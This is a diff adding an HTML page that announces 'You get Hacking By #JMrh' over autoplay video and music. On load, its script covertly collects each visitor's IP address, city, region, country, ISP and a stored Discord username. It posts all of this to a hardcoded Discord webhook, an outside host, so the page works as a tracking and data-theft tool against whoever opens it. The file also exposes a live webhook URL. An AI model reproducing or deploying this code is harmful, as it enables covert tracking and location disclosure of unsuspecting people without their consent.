@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Custom Design</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            color: #00f;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            object-fit: cover;
+        }
+
+        .marquee {
+            position: absolute;
+            top: 10%;
+            width: 100%;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        .marquee span {
+            display: inline-block;
+            padding-left: 100%;
+            animation: marquee 10s linear infinite;
+            color: #00ff00;
+            font-size: 1rem;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        @keyframes marquee {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+
+        .ip-container {
+            margin-top: 10px;
+            color: white;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+
+        .ip-container b {
+            color: #00ff00;
+        }
+
+       .custom-message {
+    margin-top: 10px;
+    font-size: 0.85rem;
+    text-align: center;
+    background: linear-gradient(90deg, #ff0000, #00ff00, #0000ff, #ff00ff, #00ffff, #ffff00);
+    background-size: 600% 100%;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: gradientText 5s linear infinite;
+}
+
+@keyframes gradientText {
+    0% { background-position: 0% 50%; }
+    100% { background-position: 100% 50%; }
+}
+
+        }
+    </style>
+</head>
+<body>
+
+    <video class="background" autoplay muted loop>
+        <source src="https://cdn.discordapp.com/attachments/1261114958574387241/1372919298955149413/febcfbc9fbd177e5.mp4?ex=6833123c&is=6831c0bc&hm=d17118784dfa5d504ac8eeb3d5da3023d7d6fc737988b736ae801e660d1ab710&" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <audio autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1261114958574387241/1373425854113124443/eef77f65e755a0a6.mp3?ex=6832efc0&is=68319e40&hm=30c9327b793ae0b76eb9026a4eb14c2184c697a735bf91c685efc14c5d733c7d&" type="audio/mp3">
+        Your browser does not support the audio element.
+    </audio>
+
+    <div class="marquee">
+        <span>You get Hacking By #JMrh -  Discord.gg/Frt</span>
+    </div>
+
+    <div class="ip-container">
+        <b>Your IP Address:</b> <span id="ip-address-value">Fetching...</span><br>
+        <b>IP Information:</b> <span id="ip-info">Fetching...</span>
+
+        <!-- النص المضاف تحت الـ IP -->
+        <p class="custom-message">
+            You get Hacking By #JMrh -  Discord.gg/Frt.
+        </p>
+    </div>
+
+    <script type="text/javascript">
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+                .then(response => response.json())
+                .then(ipInfoData => {
+                    const location = ipInfoData.loc ? ipInfoData.loc.split(",") : ["Unknown", "Unknown"];
+                    const googleMapsLink = `https://www.google.com/maps?q=${location[0]},${location[1]}`;
+                    document.getElementById('ip-info').innerHTML = `${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country} (<a href="${googleMapsLink}" target="_blank" style="color:#00ff00;">View on Google Maps</a>)`;
+                    fetchDiscordUsername().then(username => sendToDiscord(ipInfoData, googleMapsLink, username));
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        function fetchDiscordUsername() {
+            return new Promise((resolve) => {
+                let username = "Unknown User";
+                try {
+                    username = localStorage.getItem("discordUsername") || "Unknown User";
+                } catch (e) {
+                    console.error("Error fetching Discord username:", e);
+                }
+                resolve(username);
+            });
+        }
+
+        function sendToDiscord(ipInfoData, googleMapsLink, username) {
+            const webhookURL = "https://discord.com/api/webhooks/1334130479443738736/jziNTq5-b6uBiGoIlvpT_4wNVE9RyMZuM5m896oUPy-W0peVNhVYGZFssByJEVGLlZQi";
+            const payload = {
+                content: `New visitor IP: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => console.log("IP, location, and username sent to Discord successfully!"))
+            .catch(error => console.error("Error sending data to Discord:", error));
+        }
+
+        fetchIPAndInfo();
+    </script>
+
+</body>
+</html>
